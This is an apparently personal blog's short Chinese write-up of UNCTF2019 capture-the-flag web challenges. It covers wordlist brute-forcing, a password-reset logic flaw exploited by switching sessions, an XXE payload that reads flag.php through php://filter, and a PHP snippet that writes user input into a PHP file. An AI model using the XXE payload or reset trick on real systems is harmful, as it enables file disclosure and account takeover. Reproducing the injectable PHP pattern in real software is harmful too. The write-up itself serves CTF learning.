<html>
<head>
	
	<title>UNCTF2019复现</title>
	<meta name="keywords" content="Curtails的blog" />

    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    
	   <link href="/css/main.css?v=3" rel="stylesheet" type="text/css" />
    
        <script src="/js/util.js"></script>
        <script>
            if(isMobile()) {
                loadjscssfile('../css/mobile.css', 'css');
            } else {
                loadjscssfile('../css/desktop.css', 'css');
            }
        </script> 
    

    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">

    
	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3"/>
    
    

</head>

<body>


<h2 class="title">UNCTF2019复现</h2>
<!---
<div style="text-align:center;margin-top: -10px;">
<div class="article-category">
发表于2019年11月12日




 </div>
--->
</div>

<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#给赵总征婚"><span class="toc-text">给赵总征婚</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSB-Reset-Password"><span class="toc-text">NSB Reset Password</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Do-you-like-xml"><span class="toc-text">Do you like xml?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-web"><span class="toc-text">simple_web</span></a></li></ol>
<h2 id="给赵总征婚"><a href="#给赵总征婚" class="headerlink" title="给赵总征婚"></a>给赵总征婚</h2><p>rockyou字典爆破</p>
<h2 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h2><p>删除cookie账号不存在，说明通过cookie来判断用户是否存在<br>先注册新账号，找回密码，通过验证，在另一个页面找回admin密码，此时当前用户为admin，在切回通过验证页面重置密码</p>
<h2 id="Do-you-like-xml"><a href="#Do-you-like-xml" class="headerlink" title="Do you like xml?"></a>Do you like xml?</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a[ &lt;!ENTITY xxe SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>








<h2 id="simple-web"><a href="#simple-web" class="headerlink" title="simple_web"></a>simple_web</h2><p>根据提示访问./robots.txt；打开自己的沙箱，查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = addslashes($_GET[<span class="string">'content'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'content.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">'|\$content=\'.*\';|'</span>, <span class="string">"\$content='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'content.php'</span>, $file);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>addslashes</code>在预定义字符 单引号双引号反斜杠NULL前加反斜杠</p>


<!--<a href="https://curtails.github.io/2019/11/12/unctf2019/#disqus_thread" class="article-comment-link">Comments</a>
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = ''; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
-->
<div style="display:none">
<script src="http://s4.cnzz.com/stat.php?id=&web_id=" language="JavaScript"></script>script>
</div>






</body>
</html>